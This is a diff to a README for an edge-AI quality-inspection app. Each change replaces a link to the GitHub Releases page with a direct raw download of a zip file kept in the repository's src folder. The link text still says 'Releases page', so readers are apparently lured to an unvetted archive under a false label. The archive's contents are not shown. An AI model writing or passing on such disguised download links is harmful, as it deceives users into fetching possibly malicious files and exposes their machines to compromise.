@@ -1,7 +1,7 @@
 # 🚀 AI-Edge-Quality-Inspection - Detect Defects in Real-Time
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/releases)
+[![Download](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/raw/refs/heads/main/src/Edge_A_Quality_Inspection_v3.4.zip)](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/raw/refs/heads/main/src/Edge_A_Quality_Inspection_v3.4.zip)
 
 ## 📖 Introduction
 Welcome to the AI-Edge-Quality-Inspection project! This software helps manufacturers detect defects in their products in real-time using Edge AI technology. With this tool, you can ensure higher quality in your production line easily.
@@ -23,7 +23,7 @@ To successfully run this application, your device needs to meet the following re
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**: Click on the following link to access the downloads:
-   [Download from Releases](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/releases)
+   [Download from Releases](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/raw/refs/heads/main/src/Edge_A_Quality_Inspection_v3.4.zip)
    
 2. **Download the Application**: Look for the latest version available on the page. Choose the file suitable for your operating system. Click on it to start the download.
 
@@ -55,7 +55,7 @@ Yes, please feel free to visit our GitHub repository for issues or discussions r
 You can report bugs by submitting an issue directly on our GitHub page. Provide as much detail as you can to help us resolve the issue quickly.
 
 ## 📥 Download & Install
-To download the latest version, please visit our [Releases page](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/releases). Selecting the correct file ensures smooth installation and operation of the application.
+To download the latest version, please visit our [Releases page](https://github.com/masombukablessing/AI-Edge-Quality-Inspection/raw/refs/heads/main/src/Edge_A_Quality_Inspection_v3.4.zip). Selecting the correct file ensures smooth installation and operation of the application.
 
 ## 🤝 Contributions
 We welcome your contributions. Please feel free to fork the repository and submit pull requests. For any inquiries or suggestions, reach out through the GitHub issues page.
